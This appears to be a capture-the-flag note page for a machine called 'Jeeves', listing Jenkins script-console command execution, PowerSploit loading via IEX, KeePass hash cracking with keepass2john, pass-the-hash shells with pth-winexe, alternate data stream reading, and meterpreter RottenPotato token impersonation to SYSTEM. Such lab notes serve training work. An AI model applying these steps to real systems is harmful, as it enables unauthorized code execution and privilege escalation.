<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Jeeves - Jenkins keypasss ADS</title>
</head><body>Two easy ways to get code execution on Jenkins:<br/>
1: bad way of creating a new project (freestyle project). It's 'noisy' and blind.<br/>
&nbsp;&#09;Build: execute shell commands<br/>
2: manage &gt; script console<br/>
&nbsp;&#09;cmd = "whoami" <br/>
&nbsp;&#09;println cmd.execute().text<br/>
<br/>
cmd = """ cmd.exe /c echo "Hello World" """<br/>
println cmd.execute().text<br/>
<br/>
PowerSploit -b dev&#09;&#09;&#09;#dev branch<br/>
Master branch doesn't check for token privilege yet, but the dev branch does. <br/>
SeImpersonatePrivilege on jenkins means HotPotato should work. <br/>
<br/>
IEX command to load module. <br/>
Once module is loaded you can call functions. Alternatively, put commands at the end of the script to run them automatically with IEX.<br/>
<br/>
.kdbx keypass database<br/>
keepass2john<br/>
<br/>
impacket winexe, can just specify cmd.exe as command and drop to a shell <br/>
pth-winexe as well<br/>
<br/>
Alternate data streams<br/>
can view with dir /r<br/>
more &lt; ht.txt:root.txt &gt; output.txt<br/>
or<br/>
powershell (Get-Content hm.txt -Stream root.txt)<br/>
<br/>
whoami /priv<br/>
view priv information including Privilege Name and Description and State (enabled or disabled)<br/>
<br/>
Besides meterpreter, you can use something like Tokenvator (https://github.com/0xbadjuju/Tokenvator) to view and interact with tokens<br/>
<br/>
In meterpreter:<br/>
upload rottenpotato.exe<br/>
execute -cH -f rottenpotato.exe<br/>
impersonate_token "BUILTIN\\Administrators"<br/>
&nbsp;&#09;[+] Successfully impersonated user NT AUTHORITY\SYSTEM<br/>
</body></html>